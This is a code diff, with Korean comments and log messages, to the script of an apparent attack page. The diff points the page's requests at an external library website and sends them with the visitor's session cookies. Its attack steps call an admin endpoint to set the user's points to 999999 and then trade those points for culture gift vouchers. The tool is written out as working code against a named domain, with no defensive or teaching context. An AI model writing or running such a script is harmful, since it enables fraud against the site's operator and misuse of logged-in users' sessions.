@@ -359,6 +359,9 @@
     </div>
 
     <script>
+        // ⭐ 도서관 웹사이트 도메인 설정
+        const TARGET_DOMAIN = 'http://kirbylib.duckdns.org';
+
         let attackInterval = null;
         let totalExchanges = 0;
         let currentUser = null;
@@ -369,17 +372,17 @@
         // 초기화
         async function init() {
             addLog('🔧 시스템 초기화 중...', 'info');
+            addLog(`🎯 타겟: ${TARGET_DOMAIN}`, 'info');
 
             try {
-                const response = await fetch('/api/auth/me', { credentials: 'include' });
+                const response = await fetch(`${TARGET_DOMAIN}/api/auth/me`, {
+                    credentials: 'include',
+                    mode: 'cors'
+                });
 
                 if (!response.ok) {
-                    addLog('❌ 로그인이 필요합니다. /login.html로 이동하세요.', 'error');
-                    setTimeout(() => {
-                        if (!currentUser) {
-                            window.location.href = '/login.html';
-                        }
-                    }, 3000);
+                    addLog('❌ 로그인이 필요합니다.', 'error');
+                    addLog(`   ${TARGET_DOMAIN}/login.html 에서 로그인하세요.`, 'info');
                     return;
                 }
 
@@ -437,11 +440,12 @@
             try {
                 // 1단계: 포인트 조작
                 addLog('  [1/3] 포인트 조작 시도...', 'info');
-                const pointResponse = await fetch(`/admin/api/users/${currentUser.userId}/points`, {
+                const pointResponse = await fetch(`${TARGET_DOMAIN}/admin/api/users/${currentUser.userId}/points`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ points: 999999 }),
-                    credentials: 'include'
+                    credentials: 'include',
+                    mode: 'cors'
                 });
 
                 const pointData = await pointResponse.json();
@@ -455,9 +459,10 @@
 
                 // 2단계: 문화상품권 교환
                 addLog('  [2/3] 문화상품권 교환 시도...', 'info');
-                const voucherResponse = await fetch('/api/auth/exchange-voucher', {
+                const voucherResponse = await fetch(`${TARGET_DOMAIN}/api/auth/exchange-voucher`, {
                     method: 'POST',
-                    credentials: 'include'
+                    credentials: 'include',
+                    mode: 'cors'
                 });
 
                 const voucherData = await voucherResponse.json();
